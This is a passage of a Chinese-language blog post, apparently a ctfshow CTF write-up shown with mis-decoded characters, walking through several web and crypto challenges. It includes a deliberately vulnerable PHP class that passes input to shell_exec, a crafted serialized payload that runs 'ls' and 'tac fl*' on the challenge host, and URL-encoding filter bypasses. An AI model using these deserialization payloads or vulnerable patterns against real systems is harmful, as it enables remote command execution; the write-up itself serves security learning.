<p>å…¶ä¸­ï¼Œcheck() å‡½æ•°çš„ä½œç”¨æ˜¯æ£€æŸ¥è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«å­—æ¯ã€åˆ†å·ã€æ‹¬å·ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚å¦‚æœæ²¡æœ‰åŒ…å«è¿™äº›å­—ç¬¦ï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚</p>
</blockquote>
<p>å…ˆè¯´ä¸€ç§è§£æ³•ï¼Œå’Œä¸Šä¸€é¢˜æ³•äºŒä¸€æ ·</p>
<blockquote>
<p>å¯ä»¥ä½¿ç”¨è¿ç®—æ³•<code>/?num=114514%2B1805296</code>åŠ å·è¢«urlç¼–ç **%2B**ä¹Ÿå¯å¾—åˆ°flagã€‚</p>
</blockquote>
<h3 id="chatgptå¯¹ä»£ç çš„åˆ†æ"><a href="#chatgptå¯¹ä»£ç çš„åˆ†æ" class="headerlink" title="chatgptå¯¹ä»£ç çš„åˆ†æ"></a>chatgptå¯¹ä»£ç çš„åˆ†æ</h3><blockquote>
<p>è¯¥ä»£ç çš„ä½œç”¨æ˜¯æ¥å—ä¸€ä¸ªåä¸º â€œnumâ€ çš„ GET è¯·æ±‚å‚æ•°ï¼Œå¦‚æœå‚æ•°å€¼ç­‰äº 114514 å¹¶ä¸”ç»è¿‡ check()<br>å‡½æ•°æ£€æŸ¥æ²¡æœ‰åŒ…å«å­—æ¯ã€åˆ†å·ã€æ‹¬å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™ä¼šè¾“å‡º $flag å˜é‡çš„å€¼ã€‚</p>
<p>å…¶ä¸­ï¼Œcheck() å‡½æ•°çš„ä½œç”¨æ˜¯æ£€æŸ¥è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«å­—æ¯ã€åˆ†å·ã€æ‹¬å·ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚å¦‚æœæ²¡æœ‰åŒ…å«è¿™äº›å­—ç¬¦ï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å›<br>falseã€‚</p>
<p>ä¸è¿‡åœ¨ç¬¬ 6 è¡Œä»£ç ä¸­ï¼Œä½¿ç”¨äº† assert() å‡½æ•°æ¥åˆ¤æ–­ $_GET[â€˜numâ€™] æ˜¯å¦ç­‰äº<br>1919810ï¼Œå¦‚æœä¸ç­‰äºå°±ä¼šè¾“å‡ºä¸€æ®µæç¤ºä¿¡æ¯å¹¶ç»ˆæ­¢ç¨‹åºè¿è¡Œã€‚æ³¨æ„åˆ° assert()<br>å‡½æ•°æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„å‡½æ•°ï¼Œå› ä¸ºå®ƒä¼šå°†å­—ç¬¦ä¸²å‚æ•°å½“ä½œä»£ç æ‰§è¡Œï¼Œå› æ­¤å¦‚æœåœ¨è¾“å…¥ $_GET[â€˜numâ€™]<br>çš„æ—¶å€™ä¼ å…¥äº†ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå°±å¯èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p>
<p>ç”±äºä»£ç ä¸­åŒ…å«äº† flag.php æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•å¾—çŸ¥ $flag å˜é‡çš„å€¼ã€‚ä¸è¿‡å¯ä»¥å°è¯•æ„é€ ç¬¦åˆæ¡ä»¶çš„ $_GET[â€˜numâ€™]<br>å‚æ•°ï¼Œä½¿å¾—ç¨‹åºè¾“å‡º $flag å˜é‡çš„å€¼ã€‚æ³¨æ„åˆ° check()<br>å‡½æ•°ä¸­åªæ£€æŸ¥äº†å­—æ¯ã€åˆ†å·ã€æ‹¬å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨æ•°å­—ã€åŠ å·ã€å‡å·ç­‰å¸¸è§„å­—ç¬¦æ¥æ„é€ å‚æ•°ã€‚</p>
</blockquote>
<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><blockquote>
<p>ç½‘é¡µæ¸¸æˆç±»çš„é¢˜ç›®ç›´æ¥æŸ¥çœ‹å…¶æºä»£ç ã€‚</p>
</blockquote>
<p>åœ¨jsæ–‡ä»¶é‡Œçœ‹åˆ°æœ‰base64åŠ å¯†çš„å†…å®¹ã€‚è§£ç çœ‹çœ‹ã€‚<br><img src="https://img-blog.csdnimg.cn/5c5b3b1d2ec643d0a963c33a2fa414c7.png" alt="2"></p>
<blockquote>
<p>Your flag is in &#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
</blockquote>
<p>ç›´æ¥è®¿é—®å¾—åˆ°flagã€‚</p>
<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><strong>è€ƒç‚¹ï¼šååºåˆ—åŒ–</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo "Hello World!"'</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$serializecmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$unserializecmd</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serializecmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$unserializecmd</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä»£ç çš„æ„æ€æ˜¯å®šä¹‰äº†ä¸€ä¸ªwebshellç±»ï¼Œé‡Œé¢åŒ…å«ä¸€ä¸ªå…¬å…±å±æ€§ï¼ˆ<strong>cmd</strong>ï¼‰å’Œä¸‰ä¸ªå…¬å…±æ–¹æ³•ï¼ˆ**_construct()ï¼Œinit()ï¼Œexec()<strong>ï¼‰å…¶ä¸­init()æ–¹æ³•åœ¨æ„é€ å‡½æ•°_construct()ä¸­è¢«è°ƒç”¨ï¼Œç›®çš„æ˜¯ç”¨æ¥æ£€æŸ¥cmdå€¼ä¸­æ˜¯å¦å«æœ‰å‚æ•°</strong>flag<strong>å¦‚æœå«æœ‰ï¼Œåˆ™è¾“å‡º</strong>Hello World!<strong>ï¼Œåä¹‹ï¼Œåˆ™è°ƒç”¨exec()æ–¹æ³•æ¥æ‰§è¡Œ</strong>$cmd**ã€‚<br><img src="https://img-blog.csdnimg.cn/b09519fa51e74250a34f9e317b3884ce.png" alt="1"><br>å…·ä½“æ¥è¯´ï¼Œå¯ä»¥æ‰§è¡Œå¦‚ä¸‹çš„ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$W</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Webshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$W</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p> å¾—åˆ°<strong>O:8:â€Webshellâ€:1:{s:3:â€cmdâ€;s:2:â€lsâ€;}</strong></p>
<blockquote>
<p>è¿™ä¸ªå­—ç¬¦ä¸²è¡¨ç¤ºä¸€ä¸ªåŒ…å«ä¸€ä¸ªåä¸º cmd çš„å±æ€§çš„ Webshell ç±»å¯¹è±¡ã€‚s:3:â€cmdâ€ è¡¨ç¤ºå±æ€§åå­—çš„é•¿åº¦ä¸º 3ï¼Œs:2:â€lsâ€ è¡¨ç¤º $cmd å±æ€§çš„å€¼ä¸º â€œlsâ€ï¼Œå®ƒçš„é•¿åº¦ä¸º 2ã€‚é€šè¿‡å°†è¿™ä¸ªå­—ç¬¦ä¸²ä¼ é€’ç»™ unserialize() å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ååºåˆ—åŒ–ä¸ºä¸€ä¸ª Webshell å¯¹è±¡ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­åŒ…å«çš„å‘½ä»¤ã€‚</p>
</blockquote>
<p>urlï¼š<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4cc0a2e1e93546adba733d88ea1641e3.png" alt="3"><br>urlï¼š<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:7:&quot;tac fl*&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4df37ceb5f164c95b99945642caeb496.png" alt="2"></p>
<h2 id="åŒ–é›¶ä¸ºæ•´"><a href="#åŒ–é›¶ä¸ºæ•´" class="headerlink" title="åŒ–é›¶ä¸ºæ•´"></a>åŒ–é›¶ä¸ºæ•´</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>

<span class="token variable">$result</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ å¤ªé•¿äº†ï¼ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span><span class="token string double-quoted-string">"å¤§ç‰›"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>count()ç”¨æ¥ç»Ÿè®¡getä¼ å…¥å‚æ•°çš„ä¸ªæ•°ï¼Œå¦‚æœä¼ å…¥**?a&#x3D;1<strong>ï¼Œé‚£å°±æ˜¯ä¸€ä¸ªå‚æ•°ï¼Œä¼ å…¥</strong>?a&#x3D;1&amp;b&#x3D;2<strong>ï¼Œé‚£å°±æ˜¯ä¸¤ä¸ªå‚æ•°ã€‚<br>strlen()ç”¨æ¥è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¦‚æœå¤§äº1ï¼Œé‚£å°±æ‰§è¡Œdieï¼Œå¦åˆ™å°†ä¼ å…¥çš„getå‚æ•°æ‹¼æ¥åˆ°resultä¸­ã€‚<br>ç„¶åå¦‚æœresult&#x3D;&#x3D;&#x3D;å¤§ç‰›ï¼Œé‚£å°±è¾“å‡ºflagã€‚<br><strong>åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“</strong><br><code>å¤§ç‰›</code>åœ¨urlç¼–ç åæ˜¯<code>%E5%A4%A7%E7%89%9B</code>ä¸€ä¸ª%E5å ç”¨ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†</strong>å¤§ç‰›<strong>è¿›è¡Œurlç¼–ç ç„¶å</strong>forå‡½æ•°**è¿›è¡Œæ‹¼æ¥å¾—åˆ°flagã€‚ä¸€ä¸ªæ±‰å­—æœ‰3ä½urlç¼–ç ï¼Œç„¶åç”¨1-6</p>
<p>payload<code>http://da499d91-835d-4543-9c2e-faa0b2ea3723.challenge.ctf.show?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code>ä¹‹åå¾—åˆ°flagã€‚</p>
<h2 id="æ— ä¸€å¹¸å…"><a href="#æ— ä¸€å¹¸å…" class="headerlink" title="æ— ä¸€å¹¸å…"></a>æ— ä¸€å¹¸å…</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™ä¸ªé¢˜çš„æ„ä¹‰æ˜¯å•¥å‘¢ï¼Ÿ<br>æˆ‘å°±payload<code>?0=1</code>ï¼Œflagå°±å‡ºæ¥äº†ã€‚</p>
<h2 id="ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰"><a href="#ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰" class="headerlink" title="ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰"></a>ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰</h2><p><img src="https://img-blog.csdnimg.cn/86faa25095144eb18cf9de64afbcc1da.png" alt="1">æ¸¸æˆç•Œé¢ï¼Œé‚£å°±æ‰¾ä¸€ä¸‹jsä»£ç ã€‚<br><img src="https://img-blog.csdnimg.cn/71650c9a07134eb5b6c38dbbc521594f.png" alt="1"><br>ä»–è¯´åˆ†æ•°è¾¾åˆ°2077åå°±ç»™flagã€‚åœ¨å‰ç«¯æ”¹ä¸€ä¸‹è¯•è¯•ï¼Œ<br><img src="https://img-blog.csdnimg.cn/b6106be08f764e75a1e4894ec5956cf4.png" alt="1"><br>å‘ç°ä¸è¡Œã€‚å†å¥½å¥½æ‰¾ä¸€ä¸‹ï¼Œåœ¨jsæ–‡ä»¶ä¸­æœç´¢scoreã€‚æ‰¾åˆ°å…³é”®ç‚¹<br><img src="https://img-blog.csdnimg.cn/8fb09945e91f47979007d09792c3f4d9.png" alt="2"><br>åˆå­¦åˆ°äº†ä¸€ä¸ªï¼Œåœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼ˆç‚¹å‡»275å³å¯ï¼‰ï¼Œ<br><img src="https://img-blog.csdnimg.cn/5e5a7f6f549649f78e132f1eea8d43e9.png" alt="3"><br>ç„¶åå¼€å§‹æ¸¸æˆç­‰åˆ°åƒäº†ä¸€ä¸ªè‹¹æœçš„æ—¶å€™ï¼Œç¨‹åºä¼šåœ¨æ–­ç‚¹åœä¸‹ï¼Œ<br><img src="https://img-blog.csdnimg.cn/f4ee69e852294ad4a6759ec9dc942294.png" alt="4"><br>åœ¨æ§åˆ¶å°è¾“å…¥<code>var nowScore = this.score += 2078</code>å›è½¦ï¼Œ<br><img src="https://img-blog.csdnimg.cn/e683ba59ae094d319d18982091228622.png" alt="5"><br>ç„¶åç»§ç»­æ¸¸æˆ<br><img src="https://img-blog.csdnimg.cn/6574abd9ddaa4ac6888479fdb6939508.png" alt="6"><br>å¾—åˆ°flagã€‚</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="0x36d"><a href="#0x36d" class="headerlink" title="0x36d"></a>0x36d</h2><p>ğŸ˜«ğŸ™„ğŸ‘°ğŸ˜°ğŸ‘£ğŸ™‹ğŸ˜±ğŸ‘§ğŸ‘ŒğŸ‘·ğŸ‘¯ğŸ‘©ğŸ˜´ğŸ‘–ğŸ‘«ğŸ‘šğŸ™ƒğŸ‘¹ğŸ‘ğŸ‘ğŸ˜¶ğŸ‘³ğŸ˜«ğŸ‘•ğŸ™‚ğŸ™ŠğŸ‘µğŸ‘¶ğŸ‘¨ğŸ‘°ğŸ‘®ğŸ™‰ğŸ‘¶ğŸ‘µğŸ‘¸ğŸ‘²ğŸ‘ºğŸ‘®ğŸ‘‘ğŸ˜¶ğŸ‘´ğŸ˜«ğŸ™ŠğŸ‘«ğŸ˜´ğŸ‘¬ğŸ‘¹ğŸ‘¤ğŸ‘‘ğŸ˜±ğŸ‘—ğŸ™ƒğŸ‘ğŸ˜¶</p>
<p><strong>æç¤ºï¼š æœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œæ ‡é¢˜å°±æ˜¯å¯†ç ï¼Ÿ</strong><br>è¯•äº†ä¸€ä¸‹base100è§£å¯†ï¼Œä¸è¡Œã€‚é‚£å°±æ˜¯<a target="_blank" rel="noopener" href="https://txtmoji.com/">emojisè§£å¯†</a>ï¼Œéœ€è¦å¯†ç ï¼Œçœ‹é¢˜ç›®ï¼Œ0xä»£è¡¨åå…­è¿›åˆ¶è§£å¯†36då¾—åˆ°<strong>877</strong>ï¼ŒæˆåŠŸå¾—åˆ°flagã€‚</p>
 
      <!-- reward -->
      
      <div id="reword-out">
        <div id="reward-btn">
          æ‰“èµ
        </div>
      </div>
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>
          
          æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œè‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        åˆ†äº«
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://3143047748.github.io/2023/02/27/ctfshow-%E8%8F%9C%E7%8B%97%E6%9D%AF/" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2023/03/02/ctfshow-SSRF/" class="article-nav-link">
        <strong class="article-nav-caption">ä¸Šä¸€ç¯‡</strong>
        <div class="article-nav-title">
          
            ctfshow-SSRF
          
        </div>
      </a>
    
    
      <a href="/2023/02/26/ctfshow-Crypto/" class="article-nav-link">
        <strong class="article-nav-caption">ä¸‹ä¸€ç¯‡</strong>
        <div class="article-nav-title">ctfshow-Crypto</div>
      </a>
    
  </nav>

   
<!-- valineè¯„è®º -->
<div id="vcomments-box">
  <div id="vcomments"></div>
</div>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
<script>
  new Valine({
    el: "#vcomments",
    app_id: "5s6sYhVyYIhL1fb7zrErH8BX-gzGzoHsz",
    app_key: "829xTABHQSNKYRHRILDlEluh",
    path: window.location.pathname,
    avatar: "monsterid",
    placeholder: "ç»™æˆ‘çš„æ–‡ç« åŠ ç‚¹è¯„è®ºå§~",
    recordIP: true,
  });
  const infoEle = document.querySelector("#vcomments .info");
  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
    infoEle.childNodes.forEach(function (item) {
      item.parentNode.removeChild(item);
    });
  }
</script>
<style>
  #vcomments-box {
    padding: 5px 30px;
  }

  @media screen and (max-width: 800px) {
    #vcomments-box {
      padding: 5px 0px;
    }
  }

  #vcomments-box #vcomments {
    background-color: #fff;
  }

  .v .vlist .vcard .vh {
    padding-right: 20px;
  }

  .v .vlist .vcard {
    padding-left: 10px;
  }
</style>

 
   
  
   
    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
    <div id="twikoo" class="twikoo"></div>
    <script>
        twikoo.init({
            envId: ""
        })
    </script>
 
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022-2023
        <i class="ri-heart-fill heart_icon"></i> n0rt6
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>è®¿é—®äººæ•°:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>æµè§ˆæ¬¡æ•°:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
        <li>
          <a href="https://beian.miit.gov.cn/" target="_black" rel="nofollow">è±«ICPå¤‡88888888</a>
        </li>
        
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzzç»Ÿè®¡ -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.png" alt="n0rt6&#39;s bolg"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">ä¸»é¡µ</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">å½’æ¡£</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">åˆ†ç±»</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">æ ‡ç­¾</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">å‹é“¾</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">å…³äºæˆ‘</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="æœç´¢">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
